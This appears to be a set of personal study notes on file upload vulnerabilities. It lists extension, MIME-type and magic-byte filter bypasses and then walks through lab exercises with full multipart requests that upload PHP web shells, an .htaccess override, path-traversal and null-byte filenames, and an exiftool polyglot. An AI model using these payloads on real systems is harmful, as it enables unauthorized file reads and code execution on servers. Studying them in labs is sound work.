
File uploads vulns are detected when the  app allows user to  upload a file without sanitizing and/or validating  sufficiently  *name*,  *size*, *type* , *content* 




**Upload Tricks**: 

- Use double extensions : `.jpg.php, .png.php5`

- Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`

- Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`

- Null byte (works well against `pathinfo()`)
    - `.php%00.gif`
    - `.php\x00.gif`
    - `.php%00.png`
    - `.php\x00.png`
    - `.php%00.jpg`
    - `.php\x00.jpg`

- Special characters
    - Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
    - Whitespace and new line characters
        - `file.php%20`
        - `file.php%0d%0a.jpg`
        - `file.php%0a`
    - Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
    - Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
    - Multiple special characters: `file.jsp/././././.`

- Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
    - `Content-Type : image/gif`
    - `Content-Type : image/png`
    - `Content-Type : image/jpeg`
    - Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
    - Set the Content-Type twice: once for unallowed type and once for allowed.

- [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
    - Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
        - PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
        - JPG: `\xff\xd8\xff`
        - GIF: `GIF87a` OR `GIF8;`


**how do server handle requests for static files**:

the server parses the path in the request to identify the file extension then determines the type of the file typically by comparing it to a list of pre-configured mappings between extensions and MIME types so if the file is static the server sends the file content to the client HTTP response , if the file type is executable then the server is configured to execure this type and the result is then sent to the client else if its not configured to execute files of this type  it would generate an error or some contents of the file would be sent in plain text 


- servers generally only run scripts whose MIME type they have been explicitly configured to execute other way around it would be a path traversal to less strict DIR 
- if extensions didnt work check  `.php5`, `.shtml`

- Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. like
```
`LoadModule php_module /usr/lib/apache2/modules/libphp.so AddType application/x-httpd-php .php`
```
in `/etc/apache2/apache2.conf`
- Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess`
- developers can make directory-specific configuration on IIS servers using a `web.config` file


- instead of trusting the content-type  it would check some properties of image or use some fingerprint to determine wheteher it matches the content example JPEG  alwyas begin with Byte FF D8 FF



# LABS

file
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

###  Remote code execution via web shell upload
```HTTP
GET /files/avatars/file_echo.php
```



###   Web shell upload via Content-Type restriction bypass
the server trusts the **content-Type** 

```HTTP
------WebKitFormBoundarySqMDd1VMBsOcs5j1
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: image/png

<?php echo file_get_contents('/path/to/target/file'); ?>
```

Fetch
```HTTP
GET /files/avatars/file_echo.php
```


###   Web shell upload via path traversal

```HTTP

------WebKitFormBoundary18IPITth496oIf59
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2ftest.php"
Content-Type: image/png

<?php echo file_get_contents('/path/to/target/file'); ?>

```

URL encoded the file name path traversal

```HTTP
GET /files/test.php 
```

###   Web shell upload via extension blacklist bypass 

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. they usually use the file `.htaccess` it basically adds a link of some kind for the applications like `svg+xml` we can basically link it to `.something`

```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain


AddType application/x-httpd-php .php5
```

```http
------WebKitFormBoundarysS9S0fDtNAV28YZZ
Content-Disposition: form-data; name="avatar"; filename="test.php5"
Content-Type: text/plain

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```http
GET /files/avatars/test.php5
```


###   Web shell upload via obfuscated file extension

 other obfuscation  worked the file was uploaded but it didn't execute only this worked 
```http
------WebKitFormBoundarymPLuAOPDA0B4TMmx
Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
Content-Type: image/png

<?php echo file_get_contents('/path/to/target/file'); ?><?php echo file_get_contents('/home/carlos/secret'); ?>
```

```http
GET /files/avatars/test.php

```


###   Remote code execution via polyglot web shell upload

writes a comment that is executable 
```php

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" echo.jpg -o polyglot.php
```


# References 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md